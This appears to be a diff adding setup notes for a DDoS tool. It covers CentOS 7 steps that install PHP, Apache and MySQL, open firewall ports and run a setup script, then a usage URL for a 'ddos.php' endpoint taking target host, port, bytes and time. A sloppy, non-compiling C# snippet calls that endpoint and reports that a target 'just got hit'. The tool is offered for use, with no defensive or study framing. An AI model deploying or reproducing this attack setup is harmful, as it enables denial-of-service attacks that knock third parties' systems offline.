@@ -1,0 +1,38 @@
+**Centos 7**
+######################
+yum install perl
+######################
+yum install php php-mysql
+sudo chkconfig httpd on
+chkconfig mysqld on
+yum install php5 - y
+service httpd restart
+######################
+cd /var/www/html
+// drag files in 
+######################
+#installs prereqisites 
+perl setup.pl
+######################
+#open ports
+firewall-cmd --permanent --zone=public --add-service=http 
+firewall-cmd --permanent --zone=public --add-service=https
+firewall-cmd --reload
+######################
+
+// Remove []
+// Usage http://SERVERIP/ddos.php?host=[]&port=[]&bytes=[]&time=[]
+
+
+#to use in C#
+
+Webclient client = new Webclient():
+string skibidi = client.downloadstring("http://SERVERIP/ddos.php?host=[]&port=[]&bytes=1024&time=[]");
+Messagebox.show($"{iptextbox} just got hit on port {porttextbox} with method  {methodbox} for {time} seconds ");
+
+
+
+
+
+ 
+
